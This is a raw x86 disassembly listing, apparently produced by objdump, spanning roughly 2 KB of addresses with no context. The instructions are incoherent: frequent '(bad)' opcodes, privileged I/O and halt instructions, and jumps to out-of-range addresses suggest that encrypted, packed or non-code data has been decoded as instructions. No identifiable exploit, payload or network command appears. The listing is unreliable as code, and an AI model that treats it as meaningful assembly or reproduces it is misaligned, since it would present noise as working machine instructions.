  4799ed:	adc    BYTE PTR [edi],bl
  4799ef:	sub    al,0x4
  4799f1:	jl     0x479a72
  4799f3:	rol    BYTE PTR [esi],0x44
  4799f6:	push   edx
  4799f7:	xchg   ebp,eax
  4799f8:	in     al,0x9d
  4799fa:	out    0x60,eax
  4799fc:	outs   dx,BYTE PTR ds:[esi]
  4799fd:	inc    BYTE PTR [ecx]
  4799ff:	popa   
  479a00:	xor    dh,ah
  479a02:	adc    al,0x88
  479a04:	xchg   esp,eax
  479a05:	imul   edx,DWORD PTR [esi],0xc67b3774
  479a0b:	mov    BYTE PTR [eax],bh
  479a0d:	and    DWORD PTR [ebx+ecx*1+0x3d452dde],eax
  479a14:	push   es
  479a15:	iret   
  479a16:	and    edi,ebp
  479a18:	fs nop
  479a1a:	jg     0x479a4b
  479a1c:	sbb    ah,BYTE PTR [eax+0x2189b021]
  479a22:	iret   
  479a23:	and    DWORD PTR [ebx],edx
  479a25:	mov    esp,0xfa03e068
  479a2a:	jns    0x479a86
  479a2c:	popf   
  479a2d:	ret    0x6826
  479a30:	push   ebp
  479a31:	(bad)  
  479a32:	mul    DWORD PTR [ecx]
  479a34:	jnp    0xf8cdf152
  479a3a:	dec    ebp
  479a3b:	test   al,al
  479a3d:	shr    BYTE PTR [edx+eax*8],1
  479a40:	hlt    
  479a41:	and    BYTE PTR [eax],cl
  479a43:	dec    esi
  479a44:	nop
  479a45:	jle    0x479a4d
  479a47:	ss jmp 0x479a8e
  479a4a:	loopne 0x4799eb
  479a4c:	shl    DWORD PTR [edi],0x1
  479a4f:	sbb    al,0xf
  479a51:	mov    esi,0xcd2a4c15
  479a56:	and    eax,0xb906323f
  479a5b:	add    bh,BYTE PTR [edi-0x77bbeafa]
  479a61:	mov    ah,0x38
  479a63:	sub    ecx,DWORD PTR ds:0x1f6c6363
  479a69:	das    
  479a6a:	xlat   BYTE PTR ds:[ebx]
  479a6b:	daa    
  479a6c:	cmp    al,0x13
  479a6e:	mov    WORD PTR [ebx-0x123dccde],cs
  479a74:	ins    DWORD PTR es:[edi],dx
  479a75:	jl     0x5193c440
  479a7b:	cdq    
  479a7c:	add    edi,DWORD PTR ds:0xe6ea9d42
  479a82:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479a84:	fdivr  QWORD PTR [ebx]
  479a86:	add    DWORD PTR [eax],edi
  479a88:	aam    0xc2
  479a8a:	push   cs
  479a8b:	mov    edi,0xededc0a0
  479a90:	fist   WORD PTR [esi+0x5a]
  479a93:	mov    BYTE PTR [esi],al
  479a95:	mov    ebx,0xf03cf024
  479a9a:	jne    0x479ab5
  479a9c:	mov    edi,0xf62e0f24
  479aa1:	add    eax,0x6816ca9
  479aa6:	push   ds
  479aa7:	mov    cl,0x2e
  479aa9:	push   es
  479aaa:	daa    
  479aab:	test   eax,0x447f7107
  479ab0:	push   ds
  479ab1:	sub    al,bl
  479ab3:	mov    ds:0x4181b559,al
  479ab8:	int3   
  479ab9:	mov    edx,0x6f196ac4
  479abe:	rcl    DWORD PTR [edx-0x5],0xc4
  479ac2:	sbb    eax,0x44f3811
  479ac7:	or     BYTE PTR [edx+edi*1+0x6501308a],al
  479ace:	and    DWORD PTR [esi-0x59],edx
  479ad1:	je     0x479b0e
  479ad3:	inc    ebp
  479ad4:	arpl   WORD PTR [eax],ax
  479ad6:	xchg   ecx,esp
  479ad8:	push   ebx
  479ad9:	jns    0x479a5f
  479adb:	(bad)  
  479adc:	fsubr  st(0),st
  479ade:	mov    eax,ds:0x669728fc
  479ae3:	pusha  
  479ae4:	leave  
  479ae5:	es in  al,0xe8
  479ae8:	push   0x92a5095
  479aed:	dec    ebp
  479aee:	mov    WORD PTR [ecx+0x174012d0],cs
  479af4:	fsub   QWORD PTR [esi+ecx*2-0x74d65c03]
  479afb:	or     eax,0x8d2d7308
  479b00:	xchg   ecx,eax
  479b01:	sbb    al,0x6e
  479b03:	stos   DWORD PTR es:[edi],eax
  479b04:	mov    esp,0x5f41da81
  479b09:	or     ah,BYTE PTR [edi-0x2b]
  479b0c:	hlt    
  479b0d:	retf   
  479b0e:	mov    eax,ds:0xac2811dc
  479b13:	popf   
  479b14:	sti    
  479b15:	pop    ds
  479b16:	mov    DWORD PTR [ecx+0x3a899383],eax
  479b1c:	dec    ecx
  479b1d:	xor    al,0x79
  479b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479b20:	leave  
  479b21:	mov    dh,0x83
  479b23:	push   eax
  479b24:	imul   eax,DWORD PTR [ebx-0x62f53170],0xffffffff
  479b2b:	hlt    
  479b2c:	inc    ebp
  479b2d:	xor    DWORD PTR [eax+eax*2-0x3a],eax
  479b31:	inc    ebx
  479b32:	jecxz  0x479aef
  479b34:	dec    ebx
  479b35:	clc    
  479b36:	inc    edi
  479b37:	mov    ebp,0x36abb0b1
  479b3c:	in     al,dx
  479b3d:	hlt    
  479b3e:	aam    0x7e
  479b40:	dec    ecx
  479b41:	adc    dl,BYTE PTR [eax]
  479b43:	idiv   BYTE PTR [ebx+0x2f6510a]
  479b49:	inc    BYTE PTR [eax-0x80]
  479b4c:	jl     0x479b66
  479b4e:	push   DWORD PTR [esi]
  479b50:	xor    al,0x86
  479b52:	add    esi,DWORD PTR [eax-0x79]
  479b55:	mov    al,0x6e
  479b57:	retf   
  479b58:	sub    ecx,DWORD PTR [ebp-0x7b]
  479b5b:	pop    edx
  479b5c:	popf   
  479b5d:	mov    eax,0x48c483cf
  479b62:	mov    ah,ch
  479b64:	dec    esp
  479b65:	mov    ebp,0x64b34bd2
  479b6a:	push   cs
  479b6b:	push   edx
  479b6c:	jo     0x479b0c
  479b6e:	mov    edx,0xff522b23
  479b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  479b74:	jne    0x479b84
  479b76:	jo     0x479b12
  479b78:	add    bl,BYTE PTR [esi+0x64090fac]
  479b7e:	pusha  
  479b7f:	xor    ch,al
  479b81:	mov    esi,0xf8bea220
  479b86:	cmp    BYTE PTR [eax],0x7
  479b89:	cld    
  479b8a:	xchg   esi,eax
  479b8b:	in     al,dx
  479b8c:	stc    
  479b8d:	add    DWORD PTR [eax+0x24595d00],esi
  479b93:	pop    ds
  479b94:	or     bh,bh
  479b96:	sub    eax,DWORD PTR [eiz*4-0x76a63f8f]
  479b9d:	jge    0x479b8b
  479b9f:	inc    ebx
  479ba0:	xchg   BYTE PTR [eax-0x7f],bl
  479ba3:	mov    dh,0x86
  479ba5:	jb     0x479be8
  479ba7:	iret   
  479ba8:	scas   al,BYTE PTR es:[edi]
  479ba9:	xor    eax,0xfac767c1
  479bae:	in     al,dx
  479baf:	iret   
  479bb0:	jne    0x479c16
  479bb2:	jmp    0x479be4
  479bb4:	xchg   edi,eax
  479bb5:	add    BYTE PTR ds:0xb33d220e,cl
  479bbb:	in     al,dx
  479bbc:	mov    ebx,0x426e7893
  479bc1:	sub    BYTE PTR [eax-0x2ecc9d90],dh
  479bc7:	sbb    eax,0x6ac9186b
  479bcc:	sub    esi,DWORD PTR [ebx-0x78]
  479bcf:	es cwde 
  479bd1:	push   es
  479bd2:	xchg   DWORD PTR [ebp+0x62],edx
  479bd5:	adc    DWORD PTR [eax-0x39],esi
  479bd8:	idiv   DWORD PTR [ecx]
  479bda:	nop
  479bdb:	mov    dh,0x4c
  479bdd:	xor    eax,0x96c3897c
  479be2:	imul   edi,DWORD PTR [eax+0x7880e007],0x78
  479be9:	cmp    BYTE PTR [ebx-0x25],dl
  479bec:	xchg   ebx,eax
  479bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479bef:	ror    DWORD PTR [eax],0xf3
  479bf2:	idiv   DWORD PTR [ebp-0x6f7af678]
  479bf8:	cmp    DWORD PTR [edi],0xffffff8b
  479bfb:	xor    bl,BYTE PTR [ebp-0x227d3df0]
  479c01:	mov    ds:0x6cffd1b5,al
  479c06:	pop    ecx
  479c07:	sbb    ah,BYTE PTR [ebp+0x11d3ffc7]
  479c0d:	fsub   DWORD PTR [ebp+0x1c]
  479c10:	fimul  DWORD PTR [edi]
  479c12:	mov    DWORD PTR [edx],eax
  479c14:	add    esi,DWORD PTR [eax-0x584c0636]
  479c1a:	jne    0x479ba0
  479c1c:	pushf  
  479c1d:	fmul   DWORD PTR [ecx-0xdaf677f]
  479c23:	and    DWORD PTR [ebp-0x1b52aa00],esp
  479c29:	push   0xb589b85e
  479c2e:	pop    ecx
  479c2f:	mov    eax,0xe5303bf2
  479c34:	xchg   esp,eax
  479c35:	retf   0x76c2
  479c38:	cmp    BYTE PTR [edi+0x27],0x74
  479c3c:	fldenv [ecx]
  479c3e:	lahf   
  479c3f:	jo     0x479bdc
  479c41:	test   al,dh
  479c43:	pop    edi
  479c44:	pop    eax
  479c45:	in     al,0x18
  479c47:	bswap  eax
  479c49:	pop    eax
  479c4a:	sbb    al,0xae
  479c4c:	hlt    
  479c4d:	sahf   
  479c4e:	inc    ebx
  479c4f:	and    BYTE PTR [eax*1-0x7b5d18c4],bl
  479c56:	lock pushf 
  479c58:	test   BYTE PTR [eax+0x56d8e06c],dl
  479c5e:	add    BYTE PTR [ebx],al
  479c60:	stc    
  479c61:	and    BYTE PTR [esi-0xfec7aa6],bh
  479c67:	ficomp DWORD PTR [esi+0x29750d15]
  479c6d:	sbb    eax,0xac09ce5d
  479c72:	test   DWORD PTR [edi],edx
  479c74:	aad    0x2e
  479c76:	fistp  DWORD PTR [ecx]
  479c78:	das    
  479c79:	add    eax,0xb9475445
  479c7e:	adc    ebp,DWORD PTR [edi-0xc]
  479c81:	fsub   DWORD PTR [edi-0x41]
  479c84:	clc    
  479c85:	jge    0x479cf5
  479c87:	rcr    BYTE PTR [edx+0x35],0x14
  479c8b:	or     esp,esp
  479c8d:	ror    DWORD PTR [eax-0x8],0xee
  479c91:	pop    esp
  479c92:	imul   esi,DWORD PTR [edi],0x792409c4
  479c98:	popa   
  479c99:	test   ebp,eax
  479c9b:	jmp    0xe90b05a8
  479ca0:	mov    bh,0xcf
  479ca2:	rol    BYTE PTR [esi],1
  479ca4:	and    DWORD PTR [eax-0x2bfb2faa],esp
  479caa:	div    DWORD PTR [ecx-0x38]
  479cad:	jmp    0x88b99be2
  479cb2:	hlt    
  479cb3:	arpl   WORD PTR [eax+0x41e781ae],bx
  479cb9:	adc    BYTE PTR [ecx],al
  479cbb:	sub    eax,DWORD PTR [ebp-0x80]
  479cbe:	ror    DWORD PTR [esi],cl
  479cc0:	fild   DWORD PTR [eax]
  479cc2:	xchg   ecx,eax
  479cc3:	dec    esp
  479cc4:	call   0x727b526d
  479cc9:	xchg   ecx,eax
  479cca:	fcmovb st,st(2)
  479ccc:	push   ebp
  479ccd:	loop   0x479d47
  479ccf:	jno    0x7d4cbab6
  479cd5:	dec    edi
  479cd6:	fist   WORD PTR [eax]
  479cd8:	ja     0xef1f5a22
  479cde:	inc    esp
  479cdf:	cmc    
  479ce0:	test   DWORD PTR [esi+eax*4],eax
  479ce3:	xchg   BYTE PTR [ecx-0x1a],al
  479ce6:	dec    eax
  479ce7:	push   cs
  479ce8:	mov    edi,ds
  479cea:	stc    
  479ceb:	sahf   
  479cec:	out    0x6,eax
  479cee:	test   al,0xd0
  479cf0:	out    dx,eax
  479cf1:	sub    eax,DWORD PTR cs:[edi-0x467849fa]
  479cf8:	cmp    eax,0x27477bef
  479cfd:	or     eax,0x7411a16
  479d02:	cmp    ch,BYTE PTR [eax]
  479d04:	pop    eax
  479d05:	popa   
  479d06:	out    0x23,eax
  479d08:	mov    dl,0xf
  479d0a:	dec    eax
  479d0b:	push   ds
  479d0c:	(bad)  
  479d0d:	loopne 0x479d1c
  479d0f:	(bad)  
  479d10:	int    0x91
  479d12:	dec    ebp
  479d13:	in     al,0x31
  479d15:	jae    0x479cd7
  479d17:	(bad)  
  479d18:	xor    eax,0x782a57b3
  479d1d:	cmp    eax,0x33c86f35
  479d22:	add    BYTE PTR [eax+0x25e13346],cl
  479d28:	adc    BYTE PTR gs:[edx+0x1ba02737],bh
  479d2f:	shl    BYTE PTR [esi+0x57f015e0],cl
  479d35:	or     al,0x14
  479d37:	pop    esi
  479d38:	mov    al,0x87
  479d3a:	ins    DWORD PTR es:[edi],dx
  479d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  479d3c:	cmp    ebp,DWORD PTR [ecx-0x724e1b1b]
  479d42:	add    ebx,DWORD PTR [esp+ebx*8]
  479d45:	dec    esi
  479d46:	dec    esi
  479d47:	push   ds
  479d48:	jnp    0x479cd4
  479d4a:	dec    ebp
  479d4b:	fdivr  QWORD PTR [ebx]
  479d4d:	add    bl,BYTE PTR [eax]
  479d4f:	fsub   st,st(4)
  479d51:	aaa    
  479d52:	retf   0x6926
  479d55:	fadd   DWORD PTR [ebp+esi*4-0x72]
  479d59:	cmp    ecx,DWORD PTR [eax]
  479d5b:	or     eax,DWORD PTR [edx-0x14]
  479d5e:	jl     0x479d68
  479d60:	out    dx,eax
  479d61:	(bad)  
  479d62:	sub    al,0xd
  479d64:	pusha  
  479d65:	adc    DWORD PTR [eax+0x3],esi
  479d68:	mov    bh,0x1c
  479d6a:	jmp    0x479da8
  479d6c:	jmp    0x479d74
  479d6e:	mov    dh,BYTE PTR [edi+0x33579a9a]
  479d74:	cdq    
  479d75:	ror    BYTE PTR [ecx+0x1a],1
  479d78:	mov    esi,0x4368f90b
  479d7d:	push   ebp
  479d7e:	test   ah,dl
  479d80:	cmp    eax,0xd490fb5a
  479d85:	je     0x479d8f
  479d87:	pop    ecx
  479d88:	sub    ebx,0x1a
  479d8b:	popa   
  479d8c:	das    
  479d8d:	or     BYTE PTR [edi-0x651f4665],al
  479d93:	push   ebx
  479d94:	xor    BYTE PTR [edx+edx*4-0xa],bl
  479d98:	add    eax,0x8865eb7c
  479d9d:	rcl    BYTE PTR ds:0x21b7222f,1
  479da3:	fiadd  WORD PTR [ebx+0x20e03e2b]
  479da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  479daa:	add    eax,0x8d371eca
  479daf:	pop    ecx
  479db0:	ficomp DWORD PTR [ebp+0x55277b76]
  479db6:	fisttp WORD PTR [eax+0x59]
  479db9:	in     eax,0x69
  479dbb:	cmp    eax,edx
  479dbd:	(bad)  
  479dbe:	call   DWORD PTR [edx+0x50]
  479dc1:	aas    
  479dc2:	mov    ah,0xeb
  479dc4:	pop    es
  479dc5:	xchg   edx,eax
  479dc6:	out    0x70,eax
  479dc8:	jecxz  0x479d6e
  479dca:	pop    ecx
  479dcb:	cmp    DWORD PTR [eax-0x78],edi
  479dce:	shl    BYTE PTR [ebp+0x49d610d0],1
  479dd4:	test   dh,bh
  479dd6:	cwde   
  479dd7:	push   0xd603c84c
  479ddc:	(bad)  
  479ddd:	popf   
  479dde:	cli    
  479ddf:	xchg   esp,eax
  479de0:	xchg   esp,eax
  479de1:	fwait
  479de2:	jo     0x479da7
  479de4:	mov    al,bh
  479de6:	jae    0x479dfb
  479de8:	add    eax,0x534622eb
  479ded:	mov    DWORD PTR [ebp+0x53],edi
  479df0:	cmp    BYTE PTR [edx],cl
  479df2:	jnp    0x479e17
  479df4:	mov    DWORD PTR [ebp+0x7e],esi
  479df7:	imul   ebx,esp,0x939e3886
  479dfd:	mov    eax,0x3671d0d8
  479e02:	pop    ecx
  479e03:	mov    edi,0x2dfa035b
  479e08:	add    al,0xe6
  479e0a:	outs   dx,DWORD PTR ds:[esi]
  479e0b:	inc    esp
  479e0c:	mov    eax,0x73258fdf
  479e11:	pop    edi
  479e12:	and    eax,0xd2369a64
  479e17:	or     bh,bh
  479e19:	rcl    ah,1
  479e1b:	add    al,0xd0
  479e1d:	fcom   DWORD PTR [ebp-0x2395ed30]
  479e23:	push   ds
  479e24:	sbb    DWORD PTR [esi+ebx*2],edx
  479e27:	or     al,0x79
  479e29:	sti    
  479e2a:	mov    eax,ebp
  479e2c:	enter  0x83b1,0x40
  479e30:	mov    al,0x9d
  479e32:	imul   ebx,ecx,0x4300c149
  479e38:	mov    edx,0x38a49a1b
  479e3d:	xchg   ecx,eax
  479e3e:	test   eax,0x4bef50c5
  479e43:	addr16 das 
  479e45:	inc    ebp
  479e46:	sbb    ch,BYTE PTR [ecx+0x50fcd535]
  479e4c:	je     0x479ddc
  479e4e:	shr    DWORD PTR cs:[eax],0xd8
  479e52:	add    bl,BYTE PTR [eax-0x1f53bf01]
  479e58:	or     ebx,esp
  479e5a:	pop    ebx
  479e5b:	cdq    
  479e5c:	cmp    DWORD PTR [ecx+esi*8],edx
  479e5f:	sbb    bl,ch
  479e61:	shl    BYTE PTR [edi+ebp*8-0x23c4f800],cl
  479e68:	jne    0x479e5e
  479e6a:	aam    0xed
  479e6c:	push   ss
  479e6d:	cmc    
  479e6e:	fisttp WORD PTR ds:0x31eb2733
  479e74:	sub    ah,BYTE PTR [ebx-0x6e]
  479e77:	mul    BYTE PTR [ebp-0x37]
  479e7a:	lar    esp,WORD PTR [eax-0x30]
  479e7e:	shl    BYTE PTR [edi],1
  479e80:	xor    BYTE PTR [edi+ebx*8],0x74
  479e84:	mov    dl,0x78
  479e86:	jl     0x479e5c
  479e88:	test   eax,0x7b801f11
  479e8d:	sbb    BYTE PTR [edx+0x67],ch
  479e90:	jne    0x479e33
  479e92:	adc    DWORD PTR [esi+0x7e],0x2627b012
  479e99:	sub    BYTE PTR [ebx+0x74],ah
  479e9c:	xor    eax,0x11d25b35
  479ea1:	aas    
  479ea2:	imul   ebx,DWORD PTR [ecx+edx*8],0x484ddf37
  479ea9:	jns    0x479eb6
  479eab:	cmp    eax,ebp
  479ead:	xor    al,0xeb
  479eaf:	adc    cl,BYTE PTR [ebx-0x46]
  479eb2:	mov    eax,ds:0x8f348d42
  479eb7:	pop    ds
  479eb8:	(bad)  
  479eb9:	hlt    
  479eba:	lods   eax,DWORD PTR ds:[esi]
  479ebb:	sbb    eax,0x11af0bef
  479ec0:	xor    eax,0x296b5be8
  479ec5:	xor    eax,0xed36373
  479eca:	mov    dl,0x17
  479ecc:	lds    edx,FWORD PTR ds:0xa4e14302
  479ed2:	xchg   edi,eax
  479ed3:	dec    ecx
  479ed4:	xlat   BYTE PTR ds:[ebx]
  479ed5:	xor    esp,ebx
  479ed7:	popf   
  479ed8:	inc    ecx
  479ed9:	enter  0x6d7a,0x2f
  479edd:	xchg   edi,eax
  479ede:	scas   eax,DWORD PTR es:[edi]
  479edf:	and    DWORD PTR [ebx+0x6c],eax
  479ee2:	dec    edi
  479ee3:	cmp    BYTE PTR [esp+esi*1+0x34],cl
  479ee7:	sub    eax,eax
  479ee9:	mov    es,eax
  479eeb:	jb     0x479f61
  479eed:	test   edi,edi
  479eef:	xor    dh,BYTE PTR [ebx]
  479ef1:	(bad)
  479ef5:	ins    DWORD PTR es:[edi],dx
  479ef6:	mov    eax,DWORD PTR es:[ebx-0x1bad7257]
  479efd:	or     ebx,DWORD PTR [ebx]
  479eff:	jae    0x479eed
  479f01:	jmp    0x5bdf:0xa7fc
  479f07:	inc    esi
  479f08:	sub    ebx,0x4
  479f0b:	mov    esi,0xed8b744f
  479f10:	jecxz  0x479e97
  479f12:	punpcklwd mm1,DWORD PTR [eax+0x6b]
  479f16:	adc    BYTE PTR [ebx+ecx*8+0x4a],bl
  479f1a:	popa   
  479f1b:	inc    ebx
  479f1c:	out    dx,eax
  479f1d:	sub    eax,0xaa761f13
  479f22:	ret    0x6951
  479f25:	cld    
  479f26:	fucomi st,st(3)
  479f28:	mov    dh,0x6d
  479f2a:	jno    0x479f52
  479f2c:	sar    DWORD PTR [ebx],0x27
  479f2f:	pop    ebp
  479f30:	or     ah,cl
  479f32:	pop    esi
  479f33:	or     BYTE PTR [ecx-0x520b55c0],dh
  479f39:	xchg   ah,dh
  479f3b:	push   ecx
  479f3c:	lods   eax,DWORD PTR ds:[esi]
  479f3d:	or     al,cl
  479f3f:	mov    ?,WORD PTR [edi+0x622a853d]
  479f45:	in     al,0x2
  479f47:	mov    WORD PTR [esi],es
  479f49:	adc    ecx,DWORD PTR [eax+edx*2]
  479f4c:	sub    BYTE PTR [eax+0x5b],ah
  479f4f:	daa    
  479f50:	inc    esp
  479f51:	xchg   DWORD PTR [eax],edx
  479f53:	sbb    al,BYTE PTR [ebx+0x43ed8cba]
  479f59:	or     eax,0x1b8d0d8c
  479f5e:	lods   eax,DWORD PTR ds:[esi]
  479f5f:	or     eax,DWORD PTR [edi]
  479f61:	adc    dl,BYTE PTR [esi]
  479f63:	add    edx,DWORD PTR [ebp-0x1b]
  479f66:	push   0xd
  479f68:	sub    BYTE PTR [eax+edi*1],cl
  479f6b:	ins    BYTE PTR es:[edi],dx
  479f6c:	sbb    ebx,0xffffffea
  479f6f:	and    al,0x4
  479f71:	sub    DWORD PTR [eax],esi
  479f73:	hlt    
  479f74:	mov    bl,0x15
  479f76:	call   DWORD PTR [ebx-0x3a]
  479f79:	jecxz  0x479efc
  479f7b:	pop    edi
  479f7c:	mov    BYTE PTR [esi-0x3c54f021],cl
  479f82:	jmp    0x479f5e
  479f84:	adc    eax,0xf55aa17c
  479f89:	lods   eax,DWORD PTR ds:[esi]
  479f8a:	fadd   st(5),st
  479f8c:	lea    esp,[edx+0x19]
  479f8f:	ja     0x479f52
  479f91:	idiv   bl
  479f93:	xchg   esp,eax
  479f94:	inc    eax
  479f95:	inc    ebx
  479f96:	and    DWORD PTR [edi-0x3d0f8caf],ebp
  479f9c:	add    BYTE PTR [eax*1-0x6523fa5c],cl
  479fa3:	or     DWORD PTR [edi-0x6c],edi
  479fa6:	push   ds
  479fa7:	or     ah,BYTE PTR [ecx+0x5a13715c]
  479fad:	adc    al,0x85
  479faf:	push   ss
  479fb0:	add    edx,DWORD PTR [edi-0x35]
  479fb3:	sbb    DWORD PTR [eax],0x5a
  479fb6:	sub    BYTE PTR [edi+ebx*1-0x7f],cl
  479fba:	and    DWORD PTR [edi-0x26d9758c],edi
  479fc0:	lea    eax,[ebx-0x46]
  479fc3:	or     dl,bh
  479fc5:	add    edx,DWORD PTR [edx]
  479fc7:	mov    ah,0x2
  479fc9:	jne    0x479fe1
  479fcb:	rol    edx,cl
  479fcd:	jge    0x479f8f
  479fcf:	jnp    0x479f68
  479fd1:	adc    dl,BYTE PTR [edi-0x38]
  479fd4:	push   ebx
  479fd5:	clc    
  479fd6:	sub    ebx,0x6559153
  479fdc:	and    DWORD PTR [eax+0x674df19],0xeaeb1306
  479fe6:	cld    
  479fe7:	pop    ds
  479fe8:	scas   al,BYTE PTR es:[edi]
  479fe9:	or     bh,BYTE PTR ds:0x9fc3e42
  479fef:	mov    BYTE PTR [edx+0x4c],0x65
  479ff3:	retf   0x4b94
  479ff6:	push   ss
  479ff7:	call   0x3f39:0x6d0c4393
  479ffe:	loopne 0x479f8d
  47a000:	push   ss
  47a001:	mov    cs,WORD PTR [eax-0x37]
  47a004:	cmp    al,BYTE PTR [esi+edi*2+0x6bc1433c]
  47a00b:	xlat   BYTE PTR ds:[ebx]
  47a00c:	mov    edi,0x606738e
  47a011:	pop    eax
  47a012:	or     DWORD PTR [ecx],ecx
  47a014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47a015:	cld    
  47a016:	aaa    
  47a017:	sbb    al,0x4
  47a019:	aaa    
  47a01a:	push   ebx
  47a01b:	stos   DWORD PTR es:[edi],eax
  47a01c:	ja     0x47a091
  47a01e:	adc    ah,BYTE PTR [ecx]
  47a020:	pop    eax
  47a021:	add    al,0xff
  47a023:	add    dh,BYTE PTR [ebx+ebp*1-0x15]
  47a027:	pop    esp
  47a028:	push   ecx
  47a029:	inc    ebx
  47a02a:	jbe    0x479fed
  47a02c:	loopne 0x479fef
  47a02e:	cmp    al,0xcc
  47a030:	ds add ecx,ecx
  47a033:	dec    esp
  47a034:	cmp    DWORD PTR [eax],0x18230e51
  47a03a:	sub    al,0x4e
  47a03c:	xchg   edi,eax
  47a03d:	cmp    al,0x6c
  47a03f:	xor    dh,al
  47a041:	or     BYTE PTR [ecx+0x7c4e833c],bl
  47a047:	dec    eax
  47a048:	repnz sub BYTE PTR [esi],dl
  47a04b:	out    0xf9,eax
  47a04d:	(bad)  
  47a04e:	mov    gs,WORD PTR ds:0x11cc4c72
  47a054:	call   0xe0499f5c
  47a059:	push   ecx
  47a05a:	aam    0x20
  47a05c:	mov    dl,BYTE PTR [edi]
  47a05e:	mov    ds:0x974abc85,eax
  47a063:	sbb    al,0x8f
  47a065:	cs in  al,0x30
  47a068:	call   0xce387caf
  47a06d:	and    ecx,DWORD PTR [edi-0x5bfab57e]
  47a073:	lahf   
  47a074:	or     al,0x54
  47a076:	push   eax
  47a077:	clc    
  47a078:	ds add ebx,0xfffffffc
  47a07c:	jbe    0x47a081
  47a07e:	dec    ebx
  47a07f:	fst    QWORD PTR [ebp-0x58fc6286]
  47a085:	out    dx,al
  47a086:	adc    al,0xa4
  47a088:	mov    DWORD PTR [ebx],ecx
  47a08a:	adc    DWORD PTR [eax+0x4ec08f5b],eax
  47a090:	fcom   QWORD PTR [esi-0xc]
  47a093:	push   edi
  47a094:	and    DWORD PTR [edi+ecx*1],esp
  47a097:	scas   eax,DWORD PTR es:[edi]
  47a098:	ror    ecx,cl
  47a09a:	add    al,0x96
  47a09c:	mov    eax,ds:0xafd0831d
  47a0a1:	cmp    ecx,ebx
  47a0a3:	inc    eax
  47a0a4:	mov    WORD PTR [ebp+0x6089c9d3],gs
  47a0aa:	push   ebx
  47a0ab:	nop
  47a0ac:	xchg   edx,eax
  47a0ad:	mov    bh,0xf3
  47a0af:	xor    DWORD PTR [edi+edx*1-0x46],0x25a3842a
  47a0b7:	pop    edi
  47a0b8:	pop    ecx
  47a0b9:	loope  0x47a063
  47a0bb:	push   eax
  47a0bc:	cmc    
  47a0bd:	imul   edx,DWORD PTR [ecx-0xbf6a587],0xfffffff2
  47a0c4:	sbb    cl,BYTE PTR fs:[ecx+0x13]
  47a0c8:	nop
  47a0c9:	jp     0x47a069
  47a0cb:	out    0x79,eax
  47a0cd:	out    dx,eax
  47a0ce:	dec    eax
  47a0cf:	ins    BYTE PTR es:[edi],dx
  47a0d0:	push   cs
  47a0d1:	js     0x47a0d9
  47a0d3:	mov    bl,BYTE PTR [esi+ebp*4-0x20861b40]
  47a0da:	dec    ebp
  47a0db:	ds pop es
  47a0dd:	shl    BYTE PTR [esi],1
  47a0df:	fsubp  st(0),st
  47a0e1:	sahf   
  47a0e2:	idiv   DWORD PTR [edi+ebp*8]
  47a0e5:	not    BYTE PTR [esi]
  47a0e7:	dec    DWORD PTR [esi]
  47a0e9:	sbb    eax,0x6d3a2c06
  47a0ee:	lock loopne 0x47a16a
  47a0f1:	dec    ecx
  47a0f2:	jmp    0xa39cf263
  47a0f7:	and    al,0x59
  47a0f9:	sub    al,0x43
  47a0fb:	and    ch,cl
  47a0fd:	pop    ss
  47a0fe:	jmp    0x9210c416
  47a103:	sbb    al,0xc9
  47a105:	add    al,BYTE PTR [edx+ecx*1]
  47a108:	cwde   
  47a109:	in     eax,dx
  47a10a:	jb     0x47a116
  47a10c:	retf   
  47a10d:	(bad)
  47a110:	cmp    ebx,DWORD PTR [edx+eiz*4+0x6f]
  47a114:	pop    ebp
  47a115:	jg     0x47a163
  47a117:	pop    ecx
  47a118:	xchg   di,ax
  47a11a:	jmp    0x47a189
  47a11c:	das    
  47a11d:	pop    es
  47a11e:	imul   edi,DWORD PTR [edx+0x11555f07],0x7c
  47a125:	push   esi
  47a126:	(bad)
  47a129:	test   BYTE PTR [esp+ebp*8],cl
  47a12c:	inc    edi
  47a12d:	mov    edx,0x29381d08
  47a132:	xchg   BYTE PTR [edx],al
  47a134:	add    eax,0x1b49b136
  47a139:	cmp    DWORD PTR [ecx+eax*8],ecx
  47a13c:	stos   BYTE PTR es:[edi],al
  47a13d:	xchg   ecx,eax
  47a13e:	sbb    al,0xa
  47a140:	imul   esi,DWORD PTR [edx-0x6f],0x5e4a5e1f
  47a147:	mov    ah,0x2f
  47a149:	mov    ch,0x91
  47a14b:	or     eax,0x2911e409
  47a150:	cld    
  47a151:	xor    DWORD PTR [ecx+edx*4+0x4350205b],edi
  47a158:	inc    edi
  47a159:	push   0xffffffa3
  47a15b:	test   eax,0x58f2088a
  47a160:	xchg   edx,eax
  47a161:	push   esi
  47a162:	sub    dh,dh
  47a164:	dec    ebx
  47a165:	push   0xe
  47a167:	mov    esp,0x24a7ffb0
  47a16c:	(bad)  
  47a16d:	repnz xor DWORD PTR [ecx-0x6d],ebp
  47a171:	hlt    
  47a172:	adc    dh,al
  47a174:	mov    al,0xc3
  47a176:	cmp    DWORD PTR [edx-0x3c3ccdb4],0xffffffeb
  47a17d:	imul   esi,DWORD PTR [ebx+eax*1-0x21],0xb1bc3930
  47a185:	xor    DWORD PTR [ecx+0x5fe7661c],eax
  47a18b:	xchg   edx,eax
  47a18c:	pop    esi
  47a18d:	mov    eax,ds:0xcf2a1422
  47a192:	jmp    DWORD PTR [edx]
  47a194:	or     eax,0xd4d52f9
  47a199:	xchg   ebx,eax
  47a19a:	ss inc ebp
  47a19c:	pushf  
  47a19d:	retf   
  47a19e:	push   edx
  47a19f:	add    eax,0x711c73d3
  47a1a4:	and    bl,BYTE PTR [esi]
  47a1a6:	push   eax
  47a1a7:	hlt    
  47a1a8:	or     eax,0x14698877
  47a1ad:	cs ss popf 
  47a1b0:	inc    esp
  47a1b1:	push   0x4e49352
  47a1b6:	test   al,0x57
  47a1b8:	or     eax,0xf88e1373
  47a1bd:	mov    esi,0x53ff5443
  47a1c2:	push   eax
  47a1c3:	cmp    DWORD PTR [edi],esp
  47a1c5:	test   esp,edx
  47a1c7:	into   
  47a1c8:	mov    al,0x6d
  47a1cb:	push   ds
